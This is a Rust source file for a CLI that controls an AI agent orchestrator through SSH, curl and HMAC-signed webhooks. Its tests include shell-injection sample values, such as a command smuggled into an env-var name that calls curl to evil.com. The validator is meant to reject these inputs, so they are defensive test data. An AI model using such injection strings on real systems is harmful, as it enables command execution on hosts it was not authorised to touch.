//! adf-ctl: CLI control for the AI Dark Factory orchestrator.
//!
//! Triggers agents, queries status, and cancels running agents via SSH+curl
//! to the orchestrator webhook endpoint. Requires SSH access to bigbox.

use anyhow::{bail, Context, Result};
use clap::{Parser, Subcommand, ValueEnum};
use hmac::{Hmac, Mac};
use jiff::Timestamp;
use serde::Serialize;
use sha2::Sha256;
use std::io::Write;
use std::process::{Command, Stdio};

type HmacSha256 = Hmac<Sha256>;

const DEFAULT_HOST: &str = "bigbox";
const DEFAULT_ENDPOINT: &str = "http://172.18.0.1:9091/webhooks/gitea";
const DEFAULT_ORCHESTRATOR_TOML: &str = "/opt/ai-dark-factory/orchestrator.toml";
const DEFAULT_WAIT_TIMEOUT_SECS: u64 = 1200;

#[derive(Parser, Debug)]
#[command(name = "adf-ctl", about = "Control the AI Dark Factory orchestrator")]
struct Cli {
    #[command(subcommand)]
    command: AdfSub,
}

/// Output format for subcommands that support both human-readable text and
/// machine-parseable JSON. Default is `Human` for back-compatibility; the
/// `adf-orchestrate` skill and other automation should pass `--format json`.
#[derive(Copy, Clone, Debug, Default, PartialEq, Eq, ValueEnum)]
#[clap(rename_all = "lowercase")]
enum OutputFormat {
    #[default]
    Human,
    Json,
}

#[derive(Subcommand, Debug)]
enum AdfSub {
    /// Trigger an agent or persona by name
    Trigger {
        /// Agent or persona name (e.g. meta-learning, security-sentinel)
        name: String,
        /// Optional context appended to the @adf: mention
        #[arg(long, default_value = "")]
        context: String,
        /// SSH host alias
        #[arg(long, default_value = DEFAULT_HOST)]
        host: String,
        /// Webhook endpoint URL
        #[arg(long, default_value = DEFAULT_ENDPOINT)]
        endpoint: String,
        /// Webhook HMAC secret (default: auto-resolve from env/TOML)
        #[arg(long)]
        secret: Option<String>,
        /// Wait for agent to complete before returning
        #[arg(long, default_value_t = false)]
        wait: bool,
        /// Timeout in seconds when --wait is used
        #[arg(long, default_value_t = DEFAULT_WAIT_TIMEOUT_SECS)]
        timeout: u64,
    },
    /// Show running agents and recent exits [best-effort via SSH]
    Status {
        /// SSH host alias
        #[arg(long, default_value = DEFAULT_HOST)]
        host: String,
        /// journalctl --since value (e.g. 1h, 30m)
        #[arg(long, default_value = "1h")]
        since: String,
        /// Output format: human (default) or json for automation
        #[arg(long, value_enum, default_value_t)]
        format: OutputFormat,
    },
    /// Kill a running agent by name [best-effort via SSH pgrep]
    Cancel {
        /// Agent name to cancel
        name: String,
        /// SSH host alias
        #[arg(long, default_value = DEFAULT_HOST)]
        host: String,
    },
    /// List all configured agent names from orchestrator TOML
    Agents {
        /// SSH host alias
        #[arg(long, default_value = DEFAULT_HOST)]
        host: String,
        /// Output format: human (default) or json for automation
        #[arg(long, value_enum, default_value_t)]
        format: OutputFormat,
    },
}

fn main() -> Result<()> {
    let cli = Cli::parse();
    run(cli.command)
}

fn run(sub: AdfSub) -> Result<()> {
    match sub {
        AdfSub::Trigger {
            name,
            context,
            host,
            endpoint,
            secret,
            wait,
            timeout,
        } => cmd_trigger(
            &name,
            &context,
            &host,
            &endpoint,
            secret.as_deref(),
            wait,
            timeout,
        ),
        AdfSub::Status {
            host,
            since,
            format,
        } => cmd_status(&host, &since, format),
        AdfSub::Cancel { name, host } => cmd_cancel(&name, &host),
        AdfSub::Agents { host, format } => cmd_agents(&host, format),
    }
}

// --- Payload construction ---

fn build_payload(agent_name: &str, context: &str) -> String {
    let body = if context.is_empty() {
        format!("@adf:{}", agent_name)
    } else {
        format!("@adf:{} {}", agent_name, context)
    };
    let now = Timestamp::now().to_string();
    // issue_number: 0 bypasses should_skip_dispatch in the orchestrator (lib.rs:4135)
    serde_json::json!({
        "action": "created",
        "comment": {
            "id": 1,
            "body": body,
            "user": { "login": "adf-cli" },
            "created_at": now
        },
        "issue": {
            "number": 0,
            "title": "CLI trigger",
            "state": "open"
        },
        "repository": {
            "full_name": "terraphim/terraphim-ai"
        }
    })
    .to_string()
}

fn sign_payload(secret: &str, payload: &[u8]) -> String {
    let mut mac = HmacSha256::new_from_slice(secret.as_bytes()).expect("HMAC accepts any key size");
    mac.update(payload);
    hex::encode(mac.finalize().into_bytes())
}

// --- Secret resolution ---

fn resolve_secret(explicit: Option<&str>, host: &str) -> Result<String> {
    if let Some(s) = explicit {
        return Ok(s.to_string());
    }
    if let Ok(s) = std::env::var("ADF_WEBHOOK_SECRET") {
        if !s.is_empty() {
            return Ok(s);
        }
    }
    let cmd = format!(
        "grep 'secret' {} | awk -F'\"' '{{print $2}}' | head -1",
        DEFAULT_ORCHESTRATOR_TOML
    );
    let (stdout, _, code) = ssh_run(host, &cmd)?;
    let secret = stdout.trim().to_string();
    if code != 0 || secret.is_empty() {
        bail!(
            "Could not read webhook secret from {}:{}\n\
             Set ADF_WEBHOOK_SECRET env var or pass --secret",
            host,
            DEFAULT_ORCHESTRATOR_TOML
        );
    }
    // If the remote config uses an env-var reference (e.g. "${ADF_WEBHOOK_SECRET}"),
    // resolve the actual value from the remote shell environment.
    if secret.starts_with("${") && secret.ends_with("}") {
        let var_name = &secret[2..secret.len() - 1];
        // Validate: env-var names must be [A-Za-z_][A-Za-z_0-9]* only.
        // This prevents shell injection via crafted TOML values.
        if !terraphim_orchestrator::config::is_valid_env_var_name(var_name) {
            bail!(
                "Webhook secret env-var reference contains invalid characters: '{}'. \
                 Only alphanumeric characters and underscores are allowed.",
                var_name
            );
        }
        // Use printenv instead of bash echo to avoid any shell expansion.
        let env_cmd = format!("printenv {}", var_name);
        let (env_stdout, _, env_code) = ssh_run(host, &env_cmd)?;
        let env_secret = env_stdout.trim().to_string();
        if env_code != 0 || env_secret.is_empty() || env_secret == secret {
            bail!(
                "Webhook secret in {} is an env-var reference ({}), \
                 but the variable is not set on {}. \
                 Set ADF_WEBHOOK_SECRET env var locally or pass --secret",
                DEFAULT_ORCHESTRATOR_TOML,
                secret,
                host
            );
        }
        return Ok(env_secret);
    }
    Ok(secret)
}

// --- SSH transport ---

fn ssh_run(host: &str, remote_cmd: &str) -> Result<(String, String, i32)> {
    let output = Command::new("ssh")
        .arg("-o")
        .arg("BatchMode=yes")
        .arg(host)
        .arg(remote_cmd)
        .output()
        .with_context(|| format!("failed to run ssh {}", host))?;
    let stdout = String::from_utf8_lossy(&output.stdout).to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).to_string();
    let code = output.status.code().unwrap_or(-1);
    Ok((stdout, stderr, code))
}

// --- Subcommand implementations ---

fn cmd_trigger(
    name: &str,
    context: &str,
    host: &str,
    endpoint: &str,
    secret: Option<&str>,
    wait: bool,
    timeout: u64,
) -> Result<()> {
    let secret = resolve_secret(secret, host)?;
    let payload = build_payload(name, context);
    let sig = sign_payload(&secret, payload.as_bytes());

    let curl_cmd = format!(
        "curl -s -o /dev/null -w '%{{http_code}}' \
         -X POST {} \
         -H 'X-Gitea-Event: issue_comment' \
         -H 'X-Gitea-Signature: sha256={}' \
         -H 'Content-Type: application/json' \
         --data-binary @-",
        endpoint, sig
    );

    // Pipe JSON payload via stdin to avoid shell quoting issues with the JSON body
    let mut child = Command::new("ssh")
        .arg("-o")
        .arg("BatchMode=yes")
        .arg(host)
        .arg(&curl_cmd)
        .stdin(Stdio::piped())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()
        .with_context(|| format!("failed to spawn ssh {}", host))?;

    child
        .stdin
        .take()
        .expect("stdin is piped")
        .write_all(payload.as_bytes())
        .context("failed to write payload to ssh stdin")?;

    let output = child.wait_with_output().context("ssh wait failed")?;
    let http_code = String::from_utf8_lossy(&output.stdout).trim().to_string();
    let stderr = String::from_utf8_lossy(&output.stderr).trim().to_string();

    if !stderr.is_empty() {
        eprintln!("ssh stderr: {}", stderr);
    }

    match http_code.as_str() {
        "200" | "202" | "204" => {
            println!("Agent dispatched: @adf:{} (HTTP {})", name, http_code);
            println!("Monitor: ssh {} journalctl -u adf-orchestrator -f", host);
        }
        "401" => bail!("Webhook authentication failed (check secret)"),
        "400" => bail!("Bad request (HTTP 400) - check payload format"),
        "503" => bail!("Orchestrator unavailable (HTTP 503)"),
        "" => bail!(
            "No HTTP response - is the orchestrator running on {}?",
            host
        ),
        code => bail!("Unexpected HTTP status: {}", code),
    }

    if wait {
        println!(
            "Waiting for agent '{}' to complete (timeout: {}s)...",
            name, timeout
        );
        wait_for_agent_exit(name, host, timeout)?;
    }

    Ok(())
}

fn wait_for_agent_exit(name: &str, host: &str, timeout_secs: u64) -> Result<()> {
    let start = std::time::Instant::now();
    let poll_interval = std::time::Duration::from_secs(10);

    loop {
        if start.elapsed().as_secs() >= timeout_secs {
            bail!(
                "Timed out waiting for agent '{}' to complete after {}s",
                name,
                timeout_secs
            );
        }

        let elapsed_secs = start.elapsed().as_secs() + 1;
        let since = format!("{} seconds ago", elapsed_secs);
        let cmd = format!(
            "journalctl -u adf-orchestrator --since '{}' --no-pager 2>/dev/null \
             | grep 'exit classified agent={}'",
            since, name
        );

        let (stdout, _, _) = ssh_run(host, &cmd)?;
        if !stdout.trim().is_empty() {
            for line in stdout.lines() {
                println!("{}", line);
            }
            if stdout.contains("exit_class=success") || stdout.contains("exit_class=empty_success")
            {
                println!("Agent '{}' completed successfully.", name);
                return Ok(());
            } else {
                bail!(
                    "Agent '{}' exited with non-success status:\n{}",
                    name,
                    stdout.trim()
                );
            }
        }

        std::thread::sleep(poll_interval);
    }
}

fn cmd_status(host: &str, since: &str, format: OutputFormat) -> Result<()> {
    let journal_cmd = format!(
        "journalctl -u adf-orchestrator --since '{} ago' --no-pager 2>/dev/null \
         | grep -E 'exit classified|spawning agent|Agent spawned' | tail -30",
        since
    );
    let (journal_stdout, journal_stderr, _) = ssh_run(host, &journal_cmd)?;

    let pgrep_cmd = "ps -o pid,etimes,cputime,comm -p $(pgrep -d, claude 2>/dev/null) 2>/dev/null \
                     || echo '(no claude processes running)'";
    let (pgrep_stdout, _, _) = ssh_run(host, pgrep_cmd)?;

    let activity = parse_journal_activity(&journal_stdout);
    let processes = parse_running_processes(&pgrep_stdout);

    match format {
        OutputFormat::Human => {
            println!("[best-effort via SSH process scan; not authoritative without admin socket]");
            println!();
            println!("=== Recent agent activity (last {}) ===", since);
            if !journal_stderr.is_empty() {
                eprintln!("ssh stderr: {}", journal_stderr);
            }
            if journal_stdout.trim().is_empty() {
                println!("(no recent activity found)");
            } else {
                print!("{}", journal_stdout);
            }
            println!();
            println!("=== Running claude processes ===");
            print!("{}", pgrep_stdout);
        }
        OutputFormat::Json => {
            let report = StatusReport {
                host,
                since,
                recent_activity: activity,
                running_processes: processes,
                best_effort: true,
                note: "best-effort via SSH process scan; not authoritative without admin socket",
            };
            println!("{}", serde_json::to_string_pretty(&report)?);
        }
    }

    Ok(())
}

#[derive(Debug, Serialize)]
struct StatusReport<'a> {
    host: &'a str,
    since: &'a str,
    recent_activity: Vec<JournalEvent>,
    running_processes: Vec<ProcessInfo>,
    best_effort: bool,
    note: &'a str,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
struct JournalEvent {
    line: String,
}

#[derive(Debug, Serialize, PartialEq, Eq)]
struct ProcessInfo {
    pid: String,
    etimes: String,
    cputime: String,
    comm: String,
}

/// Parse `journalctl` output filtered for orchestrator events into structured
/// records. Empty input or a single placeholder line yields an empty Vec so
/// JSON consumers see a stable `[]` rather than a noisy string.
fn parse_journal_activity(stdout: &str) -> Vec<JournalEvent> {
    stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(|l| JournalEvent {
            line: l.to_string(),
        })
        .collect()
}

/// Parse `ps -o pid,etimes,cputime,comm` output. The header row is dropped, as
/// is the `(no claude processes running)` fallback emitted by the shell when
/// `pgrep` matches nothing.
fn parse_running_processes(stdout: &str) -> Vec<ProcessInfo> {
    stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty() && !l.starts_with("PID") && !l.starts_with("(no claude"))
        .filter_map(|l| {
            let mut parts = l.split_whitespace();
            let pid = parts.next()?.to_string();
            let etimes = parts.next()?.to_string();
            let cputime = parts.next()?.to_string();
            let comm = parts.next()?.to_string();
            Some(ProcessInfo {
                pid,
                etimes,
                cputime,
                comm,
            })
        })
        .collect()
}

fn cmd_cancel(name: &str, host: &str) -> Result<()> {
    println!("[best-effort via SSH process scan; not authoritative without admin socket]");
    println!("Searching for agent '{}' processes on {}...", name, host);

    let find_cmd = format!("ls /tmp/adf-worktrees/ 2>/dev/null | grep '^{}-'", name);
    let (worktrees, _, _) = ssh_run(host, &find_cmd)?;

    let pgrep_cmd = "pgrep -a claude 2>/dev/null | grep -v defunct";
    let (procs, _, _) = ssh_run(host, pgrep_cmd)?;

    if worktrees.trim().is_empty() && procs.trim().is_empty() {
        println!(
            "No active worktrees or claude processes found for '{}'.",
            name
        );
        return Ok(());
    }

    if !worktrees.trim().is_empty() {
        println!("Active worktrees for '{}':", name);
        for wt in worktrees.lines() {
            println!("  /tmp/adf-worktrees/{}", wt.trim());
        }
        println!();
    }

    if !procs.trim().is_empty() {
        println!("Running claude processes:");
        for line in procs.lines() {
            println!("  {}", line);
        }
        println!();
        println!("To kill a specific PID: ssh {} kill <PID>", host);
        println!("(Phase 2 admin socket will provide authoritative cancel)");
    }

    Ok(())
}

fn cmd_agents(host: &str, format: OutputFormat) -> Result<()> {
    let cmd = "grep '^name = ' /opt/ai-dark-factory/conf.d/*.toml \
               /opt/ai-dark-factory/orchestrator.toml 2>/dev/null \
               | awk -F'\"' '{print $2}' | sort -u";
    let (stdout, stderr, code) = ssh_run(host, cmd)?;
    if code != 0 && stdout.trim().is_empty() {
        eprintln!("ssh stderr: {}", stderr);
        bail!("Failed to list agents from {}", host);
    }
    let agents = parse_agents_list(&stdout);

    match format {
        OutputFormat::Human => {
            println!("Configured agents on {}:", host);
            for a in &agents {
                println!("  {}", a);
            }
        }
        OutputFormat::Json => {
            let report = AgentsReport { host, agents };
            println!("{}", serde_json::to_string_pretty(&report)?);
        }
    }
    Ok(())
}

#[derive(Debug, Serialize)]
struct AgentsReport<'a> {
    host: &'a str,
    agents: Vec<String>,
}

/// Parse the deduplicated agent-name list emitted by the remote grep+awk
/// pipeline. Empty lines are dropped so JSON consumers see only real names.
fn parse_agents_list(stdout: &str) -> Vec<String> {
    stdout
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(str::to_string)
        .collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_build_payload_no_context() {
        let p = build_payload("meta-learning", "");
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        assert_eq!(v["comment"]["body"], "@adf:meta-learning");
        assert_eq!(v["action"], "created");
    }

    #[test]
    fn test_build_payload_with_context() {
        let p = build_payload("meta-learning", "fleet health check");
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        assert_eq!(
            v["comment"]["body"],
            "@adf:meta-learning fleet health check"
        );
    }

    #[test]
    fn test_build_payload_issue_number_zero() {
        let p = build_payload("security-sentinel", "");
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        assert_eq!(v["issue"]["number"], 0);
    }

    #[test]
    fn test_build_payload_repo_full_name() {
        let p = build_payload("any-agent", "");
        let v: serde_json::Value = serde_json::from_str(&p).unwrap();
        assert_eq!(v["repository"]["full_name"], "terraphim/terraphim-ai");
    }

    #[test]
    fn test_sign_payload_matches_orchestrator() {
        let secret = "test-secret";
        let body = b"hello world";
        let sig = sign_payload(secret, body);
        assert!(terraphim_orchestrator::webhook::verify_signature(
            secret, body, &sig
        ));
    }

    #[test]
    fn test_sign_payload_hex_format() {
        let sig = sign_payload("test-secret", b"hello world");
        assert!(!sig.is_empty());
        assert!(sig.chars().all(|c| c.is_ascii_hexdigit()));
        assert_eq!(sig.len(), 64);
    }

    #[test]
    fn test_parse_agents_list_basic() {
        let stdout = "meta-learning\nsecurity-sentinel\nbuild-runner\n";
        let parsed = parse_agents_list(stdout);
        assert_eq!(
            parsed,
            vec![
                "meta-learning".to_string(),
                "security-sentinel".to_string(),
                "build-runner".to_string(),
            ]
        );
    }

    #[test]
    fn test_parse_agents_list_drops_blank_lines() {
        let stdout = "\n\nmeta-learning\n\n  \nsecurity-sentinel\n";
        let parsed = parse_agents_list(stdout);
        assert_eq!(
            parsed,
            vec!["meta-learning".to_string(), "security-sentinel".to_string()]
        );
    }

    #[test]
    fn test_parse_agents_list_empty_returns_empty() {
        assert!(parse_agents_list("").is_empty());
        assert!(parse_agents_list("\n\n\n").is_empty());
    }

    #[test]
    fn test_agents_report_json_shape() {
        let report = AgentsReport {
            host: "bigbox",
            agents: vec!["meta-learning".to_string(), "build-runner".to_string()],
        };
        let json = serde_json::to_value(&report).unwrap();
        assert_eq!(json["host"], "bigbox");
        assert_eq!(json["agents"][0], "meta-learning");
        assert_eq!(json["agents"][1], "build-runner");
        assert_eq!(json["agents"].as_array().unwrap().len(), 2);
    }

    #[test]
    fn test_parse_journal_activity_filters_blanks() {
        let stdout = "May 16 12:00 exit classified agent=meta-learning exit_class=success\n\n\
                      May 16 12:05 spawning agent=build-runner\n";
        let parsed = parse_journal_activity(stdout);
        assert_eq!(parsed.len(), 2);
        assert!(parsed[0].line.contains("meta-learning"));
        assert!(parsed[1].line.contains("build-runner"));
    }

    #[test]
    fn test_parse_running_processes_strips_header_and_placeholder() {
        let stdout = "  PID  ELAPSED     TIME COMMAND\n\
                      12345     3600 00:05:23 claude\n\
                      12346      120 00:00:11 claude\n";
        let parsed = parse_running_processes(stdout);
        assert_eq!(parsed.len(), 2);
        assert_eq!(parsed[0].pid, "12345");
        assert_eq!(parsed[0].etimes, "3600");
        assert_eq!(parsed[0].cputime, "00:05:23");
        assert_eq!(parsed[0].comm, "claude");
    }

    #[test]
    fn test_parse_running_processes_no_claude_placeholder() {
        let parsed = parse_running_processes("(no claude processes running)\n");
        assert!(parsed.is_empty());
    }

    #[test]
    fn test_status_report_json_includes_best_effort_flag() {
        let report = StatusReport {
            host: "bigbox",
            since: "1h",
            recent_activity: vec![],
            running_processes: vec![],
            best_effort: true,
            note: "test",
        };
        let json = serde_json::to_value(&report).unwrap();
        assert_eq!(json["host"], "bigbox");
        assert_eq!(json["since"], "1h");
        assert_eq!(json["best_effort"], true);
        assert!(json["recent_activity"].is_array());
        assert!(json["running_processes"].is_array());
    }

    #[test]
    fn test_output_format_default_is_human() {
        assert_eq!(OutputFormat::default(), OutputFormat::Human);
    }

    #[test]
    fn test_resolve_secret() {
        std::env::remove_var("ADF_WEBHOOK_SECRET");
        let result = resolve_secret(Some("mysecret"), "unused-host-in-unit-test");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "mysecret");

        std::env::set_var("ADF_WEBHOOK_SECRET", "env-secret");
        let result = resolve_secret(None, "unused-host-in-unit-test");
        std::env::remove_var("ADF_WEBHOOK_SECRET");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "env-secret");
    }

    // === P1: Shell injection prevention tests ===

    #[test]
    fn test_is_valid_env_var_name_accepts_valid() {
        assert!(terraphim_orchestrator::config::is_valid_env_var_name("ADF_WEBHOOK_SECRET"));
        assert!(terraphim_orchestrator::config::is_valid_env_var_name("MY_SECRET"));
        assert!(terraphim_orchestrator::config::is_valid_env_var_name("_underscore_start"));
        assert!(terraphim_orchestrator::config::is_valid_env_var_name("a"));
        assert!(terraphim_orchestrator::config::is_valid_env_var_name("A1B2C3"));
    }

    #[test]
    fn test_is_valid_env_var_name_rejects_empty() {
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name(""));
    }

    #[test]
    fn test_is_valid_env_var_name_rejects_digit_start() {
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("1SECRET"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("0"));
    }

    #[test]
    fn test_is_valid_env_var_name_rejects_shell_metacharacters() {
        // These are the injection vectors from the security finding
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("ADF_SECRET}; curl https://evil.com"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR$(evil)"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR`evil`"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR|evil"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR;evil"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR&&evil"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR>evil"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR<evil"));
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR-EVIL")); // hyphen
        assert!(!terraphim_orchestrator::config::is_valid_env_var_name("VAR.EVIL")); // dot
    }

    #[test]
    fn test_resolve_secret_injection_rejected() {
        // The resolve_secret function should reject env-var refs with
        // invalid names before attempting SSH. Since explicit secrets
        // bypass the env-var resolution, we test the validation guard
        // by checking that the env-var path would reject crafted names.
        //
        // We can't easily unit-test the SSH path without a mock, but
        // is_valid_env_var_name covers the guard. Here we verify the
        // non-env-var path still works for explicit secrets.
        let result = resolve_secret(Some("plain-secret"), "unused");
        assert!(result.is_ok());
        assert_eq!(result.unwrap(), "plain-secret");
    }
}
